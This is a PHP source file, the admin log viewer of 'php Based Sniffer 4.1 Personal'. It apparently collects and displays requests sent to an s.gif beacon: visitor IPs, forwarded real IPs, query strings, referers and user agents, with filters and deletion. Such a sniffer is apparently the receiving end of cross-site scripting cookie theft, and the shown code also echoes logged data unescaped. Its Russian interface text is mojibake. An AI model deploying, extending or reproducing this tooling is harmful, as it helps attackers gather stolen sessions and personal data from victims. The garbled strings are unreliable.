<?
define("FILE", "log.php");

require "config.php";
require "functions.php";

if ($auth_enabled) {
	$authorized = false;
	if (isset($_SERVER['PHP_AUTH_USER']) and isset($_SERVER['PHP_AUTH_PW'])) {
		if ($_SERVER['PHP_AUTH_USER'] == $user and $_SERVER['PHP_AUTH_PW'] == $password) $authorized = true;
	}
	if (!$authorized) {
		header("WWW-Authenticate: Basic realm=\"php Based Sniffer 4.1 Personal\"");
		header("HTTP/1.1 401 Unauthorized");
		die("� ������� ��������.");
	}
}

$data = array();
$data_content = get_file_content($data_filename);
if ($data_content !== NULL) $data = unserialize($data_content);
$entries_num = count($data);

if ($_POST['delete']) {
	$new_entries_num = del_entries($data, $_POST['select'], $_POST['count']);
	if ($entries_on_page > 0) {
		$pages_num = ceil($new_entries_num/$entries_on_page);
		if ((int)$_GET['page'] <= 0) $page = 1;
			elseif ((int)$_GET['page'] > $pages_num) $page = $pages_num;
				else $page = (int)$_GET['page'];
	}
	$path = ($page > 1) ? FILE."?page=".$page : FILE;
	header("Location: $path");
	die;
}

if ($_GET['order'] and preg_match("/^(a|de)sc$/i", $_GET['order'])) $order = $_GET['order'];
	elseif ($_COOKIE['s_order'] and preg_match("/^(a|de)sc$/i", $_COOKIE['s_order'])) $order = $_COOKIE['s_order'];
		else $order = "asc";
setcookie("s_order", $order, time()+7776000);

if ($entries_on_page > 0) {
	$entries_shown = $entries_on_page;
	$pages_num = ceil($entries_num/$entries_on_page);
}
else {
	$entries_shown = $entries_num;
	$pages_num = 1;
}

if ((int)$_GET['page'] < 1) $page = 1;
	elseif ((int)$_GET['page'] > $pages_num) $page = $pages_num;
		else $page = (int)$_GET['page'];
$path = ($page > 1) ? FILE."?page=$page" : FILE;

if ($pages_num > 1) {
	$pages_list .= "<b>";
	for ($i=1; $i<=$pages_num; $i++) {
		if ($i != $page) {
			if ($i == 1) $pages_list .= "<a href=\"".FILE."\">";
				else $pages_list .= "<a href=\"".FILE."?page=$i\">";
		}
			else $pages_list .= "<span class=\"choosed\">";
		$pages_list .= $i;
		if ($i != $page) $pages_list .= "</a>";
			else $pages_list .= "</span>";
		$pages_list .= " ";
	}
	$pages_list .= "</b>";
}

if ($order == "asc") {
	$start_num = ($page-1) * $entries_shown;
	$finish_num = ($page * $entries_shown < $entries_num) ? $page * $entries_shown : $entries_num;
}
elseif ($order == "desc") {
	$start_num = ($page * $entries_shown < $entries_num) ? $entries_num - $page * $entries_shown : 0;
	$finish_num = $entries_num - ($page-1) * $entries_shown;
}
$entries_shown = $finish_num - $start_num;

$hosts = array();
foreach ($data as $key => $entrie) {
	if ($key < $start_num or $key >= $finish_num) continue;
	$sniffed = unserialize($entrie);
	preg_match("/^https?:\/\/([^\/]+)/i", $sniffed['referer'], $matches);
	$sniffed['host'] = $matches[1];
	if (!empty($sniffed['host']) and !in_array($sniffed['host'], $hosts)) $hosts[] = $sniffed['host'];
	if (empty($sniffed['referer'])) $emptyreferer = true;
	if (empty($sniffed['query'])) $emptyquery = true;
}

if ($entries_on_page > 0 and $pages_pos != "up" and $pages_pos != "down" and $pages_pos != "updown") die("�������� �������� ��������� <code>\$pages_pos</code>.");
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>��� ��������</title>
<link rel="stylesheet" type="text/css" href="<?=$style_filename?>">

<style type="text/css">
table.margined {margin-top:4px;}
td.padded {padding:2px 0px 2px 0px;}
td.right-padded {padding:2px 5px 2px 0px; text-align:right;}
td.top-right-padded {padding:5px 5px 2px 0px; vertical-align:top; text-align:right;}
.choosed {border:1px solid; padding:0px 2px 1px 2px;}
.input {font-size:12px;}
.visible {display:;}
.hidden {display:none;}
</style>

<? if ($entries_num > 0) { ?>
<script type="text/javascript">
function getElement(element_id)
{
	if (document.getElementById) return document.getElementById(element_id);
		else if (document.all) return document.all[element_id];
		else if (document.layers) return document.layers[element_id];
		else return null;
}

function showElement(element_id)
{
	getElement(element_id).className = 'visible';
}

function hideElement(element_id)
{
	getElement(element_id).className = 'hidden';
}

function isShown(element_id)
{
	if (getElement(element_id).className == 'visible') return true;
		else return false;
}

window.onload = function() {
	showContent();
	setInterval('textFields()', 1000);
}

var show_ip_focused = 0, show_query_focused = 0, show_agent_focused = 0;
var choosed_item = 'show_all';

function trim(s)
{
	s = s.replace(/^\s+/, '');
	s = s.replace(/\s+$/, '');
	return s;
}

function shownNum()
{
	var shown;
	for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
		if (isShown('entrie['+i+']')) shown++;
	}
	getElement('shown_num').innerHTML = shown;
	if (shown == 0) getElement('check_all').disabled = true;
		else getElement('check_all').disabled = false;
	if (shown == 0) getElement('nothing').innerHTML = '������ ������� �� ������������� �� ����� ������.';
		else getElement('nothing').innerHTML = '';
}

function checkedNum(new_active, e)
{
	if (e && e.shiftKey) {
		if (new_active > active) {
			for (i=active; i<=new_active; i++) {
				if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = getElement('select['+new_active+']').checked;
			}
		}
		if (new_active < active) {
			for (i=active; i>=new_active; i--) {
				if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = getElement('select['+new_active+']').checked;
			}
		}
	}
	var checked, shown_checked;
	for (i=<?=$start_num?>, checked=0, shown_checked=0; i<<?=$finish_num?>; i++) {
		if (getElement('select['+i+']').checked) {
			checked++;
			if (isShown('entrie['+i+']')) shown_checked++;
			getElement('table['+i+']').className = 'marked';
		}
			else getElement('table['+i+']').className = 'unmarked';
	}
	if (shown_checked != 0 && shown_checked == getElement('shown_num').innerHTML) getElement('check_all').checked = true;
		else getElement('check_all').checked = false;
	getElement('checked_num').innerHTML = checked;
	active = new_active;
}

function checkAll()
{
	if (getElement('check_all').checked) {
		for (i=<?=$start_num?>; i<<?=$finish_num?>; i++) {
			if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = true;
		}
	}
	if (!getElement('check_all').checked) {
		for (i=<?=$start_num?>; i<<?=$finish_num?>; i++) {
			if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = false;
		}
	}
	checkedNum(getElement('shown_num').innerHTML-1);
}

function switchItem(item_name)
{
	var invert = false;
	if (getElement('invert').checked) invert = true;
	if (item_name == 'show_all' && !invert) getElement('show_all').innerHTML = '<span class="choosed">���</span>';
		else if (item_name == 'show_all' && invert) getElement('show_all').innerHTML = '<span class="choosed">�� ������</span>';
			else getElement('show_all').innerHTML = '<a href="javascript:applyFilter(\'show_all\');">���</a>';
<? if ($emptyquery) { ?>
	if (item_name == 'show_empty_query' && !invert) getElement('show_empty_query').innerHTML = '<span class="choosed">� ������ QUERY</span>';
		else if (item_name == 'show_empty_query' && invert) getElement('show_empty_query').innerHTML = '<span class="choosed">� �������� QUERY</span>';
			else getElement('show_empty_query').innerHTML = '<a href="javascript:applyFilter(\'show_empty_query\');">c&nbsp;������&nbsp;QUERY</a>';
<? }
if ($emptyreferer) { ?>
	if (item_name == 'show_empty_referer' && !invert) getElement('show_empty_referer').innerHTML = '<span class="choosed">� ������ REFERER</span>';
		else if (item_name == 'show_empty_referer' && invert) getElement('show_empty_referer').innerHTML = '<span class="choosed">� �������� REFERER</span>';
			else getElement('show_empty_referer').innerHTML = '<a href="javascript:applyFilter(\'show_empty_referer\');">c&nbsp;������&nbsp;REFERER</a>';
<? } ?>
	if (item_name == 'show_host' && !invert) getElement('show_host').innerHTML = '<span class="choosed">�� �����</span>:';
		else if (item_name == 'show_host' && invert) getElement('show_host').innerHTML = '<span class="choosed">����� �����</span>:';
			else getElement('show_host').innerHTML = '�� �����:';
	if (item_name == 'show_ip' && !invert) getElement('show_ip').innerHTML = '<span class="choosed">�� IP</span>:';
		else if (item_name == 'show_ip' && invert) getElement('show_ip').innerHTML = '<span class="choosed">����� IP</span>:';
			else getElement('show_ip').innerHTML = '�� IP:';
	if (item_name == 'show_query' && !invert) getElement('show_query').innerHTML = '<span class="choosed">�� QUERY</span>:';
		else if (item_name == 'show_query' && invert) getElement('show_query').innerHTML = '<span class="choosed">����� QUERY</span>:';
			else getElement('show_query').innerHTML = '�� QUERY:';
	if (item_name == 'show_agent' && !invert) getElement('show_agent').innerHTML = '<span class="choosed">�� USER-AGENT</span>:';
		else if (item_name == 'show_agent' && invert) getElement('show_agent').innerHTML = '<span class="choosed">����� USER-AGENT</span>:';
			else getElement('show_agent').innerHTML = '�� USER-AGENT:';
	choosed_item = item_name;
}

function applyFilter(filter_name)
{
	var shown, host;
	if (filter_name == 'invert' && !getElement('invert').checked) filter_name = choosed_item;
	if (filter_name != 'invert' && getElement('invert').checked) getElement('invert').checked = false;
	if (filter_name != 'show_host' && filter_name != 'invert') getElement('choose_host').selected = true;
	if (filter_name == 'show_all') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) showElement('entrie['+i+']');
		switchItem('show_all');
	}
<? if ($emptyquery) { ?>
	if (filter_name == 'show_empty_query') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('query['+i+']').innerHTML == '') showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_empty_query');
	}
<? }
if ($emptyreferer) { ?>
	if (filter_name == 'show_empty_referer') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('host['+i+']').innerHTML == '') showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_empty_referer');
	}
<? } ?>
	if (filter_name == 'show_host') {
		for (i=0, shown=0; i<<?=count($hosts)?>; i++) {
			if (getElement('show_host['+i+']').selected) host = getElement('show_host['+i+']').innerHTML;
		}
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('host['+i+']').innerHTML == host) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_host');
	}
	if (filter_name == 'show_ip') {
		var show_ip_addr = trim(getElement('show_ip_addr').value);
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('ip['+i+']').innerHTML.indexOf(show_ip_addr) != -1) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_ip');
	}
	if (filter_name == 'show_query') {
		var show_query_text = trim(getElement('show_query_text').value);
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('query['+i+']').innerHTML.indexOf(show_query_text) != -1) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_query');
	}
	if (filter_name == 'show_agent') {
		var show_agent_info = trim(getElement('show_agent_info').value);
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('agent['+i+']').innerHTML.indexOf(show_agent_info) != -1) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_agent');
	}
	if (filter_name == 'invert') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (!isShown('entrie['+i+']')) showElement('entrie['+i+']');
				else if (getElement('entrie['+i+']')) hideElement('entrie['+i+']');
		}
		switchItem(choosed_item);
	}
	shownNum();
	checkedNum(getElement('shown_num').innerHTML-1);
}

function isChecked()
{
	var checked = parseFloat(getElement('checked_num').innerHTML);
	if (checked == 0) {
		checked = false;
		alert('�� �� �������� �� ����� ������!')
	}
	return checked;
}

function moreFilters()
{
	if (getElement('more_filters').innerHTML == '���. �������') {
		getElement('more_filters').innerHTML = '������ ���. �������';
		showElement('td_1');
		showElement('td_2');
		showElement('td_3');
	}
	else if (getElement('more_filters').innerHTML == '������ ���. �������') {
		getElement('more_filters').innerHTML = '���. �������';
		hideElement('td_1');
		hideElement('td_2');
		hideElement('td_3');
	}
}

function textFields()
{
	if (show_ip_focused == 1 && getElement('show_ip_addr').value != '') applyFilter('show_ip');
	if (show_query_focused == 1 && getElement('show_query_text').value != '') applyFilter('show_query');
	if (show_agent_focused == 1 && getElement('show_agent_info').value != '') applyFilter('show_agent');
}

function realIPInfo()
{
	alert('� ���� ���� ������������ IP-�����(�), ������������(-��) � ��������� HTTP_X_FORWARDED_FOR ������ � �������� IP. ��� �������, ��� ���� �������������, ���� ������ ����������� � �������� �� ��������, � ����� ����������� ������-������ (� ����� ������ ������������ ��������� IP), ���� ����� ��������� ���� (� ����� ������ ������������ ������������� IP ������������).');
}

function showContent()
{
	getElement('check_all').disabled = false;
	getElement('invert').checked = false;
	hideElement('loading');
	checkedNum(<?=$entries_num-1?>);
	showElement('content');
	showElement('check_control');
	clearTimeout(load_timeout);
}
</script>
<? } ?>
</head>

<body>
<? if ($info_line) { ?>������: <i><?=date("d.m.Y H:i")?></i>. &nbsp;��� IP: <b><?=$_SERVER['REMOTE_ADDR']?></b>. <a href="s.gif" target="_blank">������ �� s.gif</a> &nbsp;<a href="javascript:location.reload();" style="text-decoration:none;"><img src="refresh.gif" width="9" height="10" border="0" alt="��������" style="vertical-align:middle;">&nbsp;<span style="text-decoration:underline;">��������</span></a><? }
if ($entries_num > 0) { ?>
<form method="post" action="<?=$path?>" onSubmit="return isChecked();">
<input type="hidden" name="delete" value="1">
<input type="hidden" name="count" value="<?=$entries_num?>">
<span id="check_control" class="hidden">
<p><input type="submit" class="button" value="������� ����������">
&nbsp;&nbsp;<input type="checkbox" id="check_all" onClick="checkAll();"><label for="check_all">�������� ���</label></p></span>
<? } ?>
<p>����� �������: <b class="col"><?=$entries_num?></b>.
<? if ($entries_num > 0) { ?>
<span id="loading"><p><b>�������� �������<span id="dots">...</span></b></p></span>
<script type="text/javascript">
var load_timeout = 0;
function loading()
{
	if (getElement('dots').innerHTML == '...') getElement('dots').innerHTML = '';
	else if (getElement('dots').innerHTML == '') getElement('dots').innerHTML = '.';
	else if (getElement('dots').innerHTML == '.') getElement('dots').innerHTML = '..';
	else if (getElement('dots').innerHTML == '..') getElement('dots').innerHTML = '...';
	load_timeout = setTimeout('loading()', 200);
}
loading();
</script>
<span id="content" class="hidden">
�� ��� ��������: <b class="col"><span id="shown_num"><?=$entries_shown?></span></b>. ��������: <b class="col"><span id="checked_num">0</span></b>.&nbsp;&nbsp;<br>
<table cellpadding="0" cellspacing="0" class="margined">
<tr>
<td rowspan="2" valign="top" class="padded">
����������: <? if ($order == "desc") { ?><span class="choosed">����� ������</span> &nbsp;<a href="log.php?order=asc">����� �����</a><? } if ($order == "asc") { ?><a href="log.php?order=desc">����� ������</a> &nbsp;<span class="choosed">����� �����</span><? } ?></td>
</tr>
</table>
<table cellpadding="0" cellspacing="0" class="margined">
<tr>
<td class="right-padded">���������� �������:</td>
<td class="padded">
<span id="show_all"><span class="choosed">���</span></span><? if ($emptyquery) { ?> &nbsp;<span id="show_empty_query"><a href="javascript:applyFilter('show_empty_query');">c&nbsp;������&nbsp;QUERY</a></span><? } if ($emptyreferer) { ?> &nbsp;<span id="show_empty_referer"><a href="javascript:applyFilter('show_empty_referer');">c&nbsp;������&nbsp;REFERER</a></span><? } ?>
</td>
<td align="right">&nbsp;&nbsp;&nbsp;<input type="checkbox" id="invert" onClick="javascript:applyFilter('invert');"><label for="invert">��������</label></td>
</tr>
<tr>
<td class="top-right-padded">�����������:</td>
<td colspan="2">
<table cellpadding="0" cellspacing="0">
<tr>
<td width="104" class="right-padded"><span id="show_host">�� �����:</span></td>
<td class="padded">
<select class="input" onChange="if (!getElement('choose_host').selected) applyFilter('show_host');"><option id="choose_host" selected>(��������)</option><? foreach ($hosts as $key => $host) echo "<option id=\"show_host[$key]\">$host</option>"; ?></select>
</td>
</tr>
<tr>
<tr id="td_1" class="hidden">
<td width="104" class="right-padded"><span id="show_ip">�� IP:</span></td>
<td class="padded">
<input type="text" id="show_ip_addr" class="input" onFocus="show_ip_focused = 1;" onBlur="show_ip_focused = 0;">
</td>
</tr>
<tr id="td_2" class="hidden">
<td width="104" class="right-padded"><span id="show_query">�� QUERY:</span></td>
<td class="padded">
<input type="text" id="show_query_text" class="input" onFocus="show_query_focused = 1;" onBlur="show_query_focused = 0;">
</td>
</tr>
<tr id="td_3" class="hidden">
<td width="104" class="right-padded"><span id="show_agent">�� USER-AGENT:</span></td>
<td class="padded">
<input type="text" id="show_agent_info" class="input" onFocus="show_agent_focused = 1;" onBlur="show_agent_focused = 0;">
</td>
</tr>
<tr>
<td colspan="2" align="center">
<small>(<a href="javascript:;" onClick="moreFilters();" id="more_filters">���. �������</a>)</small>
</td>
</tr>
</table>
</td>
</tr>
</table>
<? } ?>
</p>
<p></p>
<? if ($max_entries != 0 and $entries_num >= $max_entries) { ?>
<p><b>��������! ��������� ����� �������! ��� ��������� ��������� �&nbsp;�������� ������ ������ ����� ���������.</b></p>
<? }

if ($pages_num > 1 and ($pages_pos == "up" or $pages_pos == "updown")) echo "<p>��������: $pages_list</p>\n";

for ($i=0; $i<$entries_shown; $i++) {
	$key = ($order == "asc") ? $start_num+$i : $finish_num-$i-1;
	$entrie = $data[$key];
	$sniffed = unserialize($entrie);
	preg_match("/^https?:\/\/([^\/]+)\//i", $sniffed['referer'], $matches);
	$sniffed['host'] = $matches[1];
	$sniffed['real_ip'] = preg_replace("/(, )?".$sniffed['ip']."(, )?/", "", $sniffed['real_ip']);
?>
<div id="entrie[<?=$key?>]" class="visible">
<table id="table[<?=$key?>]" width="100%" cols="2" class="unmarked">
<tr>
<td colspan="2"><? if (!empty($sniffed['host'])) { ?>������ � <b class="col"><span id="host[<?=$key?>]"><?=$sniffed['host']?></span></b><? } else { ?><span id="host[<?=$key?>]"></span>������ ���������� ������<? } ?> � <i><?=$sniffed['date']?></i></td>
</tr>
<tr>
<td width="30"><input type="checkbox" name="select[<?=$key?>]" id="select[<?=$key?>]" value="<?=$key?>" onClick="checkedNum(<?=$key?>, event);"></td>
<td>
<label for="select[<?=$key?>]"><b>IP:</b></label> <span id="ip[<?=$key?>]"><?=$sniffed['ip']?></span> <small>(<a href="http://nic.ru/whois/?ip=<?=$sniffed['ip']?>" target="_blank">whois</a>)</small><? if (!empty($sniffed['real_ip'])) { ?> &nbsp;&nbsp;<b>Real IP<a href="javascript:realIPInfo();">*</a>:</b> <?=$sniffed['real_ip']?> <small>(<a href="http://nic.ru/whois/?ip=<?=$sniffed['real_ip']?>" target="_blank">whois</a>)</small><? } ?><br>
<label for="select[<?=$key?>]"><b>QUERY:</b></label> <span id="query[<?=$key?>]"><?=$sniffed['query']?></span><br>
<label for="select[<?=$key?>]"><b>REFERER:</b></label> <? if ($sniffed['referer']) { ?><a href="<?=$sniffed['referer']?>" target="_blank"><?=$sniffed['referer']?></a><? } ?><br>
<label for="select[<?=$key?>]"><b>AGENT:</b></label> <span id="agent[<?=$key?>]"><?=$sniffed['agent']?></span><br>
</td>
</tr>
</table>
<br>
</div>
<? }
if ($entries_num > 0) { ?>
<span id="nothing"></span>
<? if ($pages_num > 1 and ($pages_pos == "down" or $pages_pos == "updown")) echo "<p>��������: $pages_list</p>\n"; ?>
</span>
</form>
<? } ?>
<p id="copyright">
php Based Sniffer 4.1 Personal<br>
<span class="hidden"><a href="http://kanick.ru/sniffer/#about">php-�������</a>, <a href="http://kanick.ru/sniffer/#func">������ ������� �� php</a>, <a href="http://kanick.ru/sniffer/#download">������� �������</a>, <a href="http://kanick.ru/sniffer/">php based sniffer 4</a>, <a href="http://kanick.ru/sniffer/#buy">������ ��������</a></span>
&copy; <a href="http://kanick.ru">Kanick</a> 2005�2006
<a href="#">#</a></p>
</body>
</html>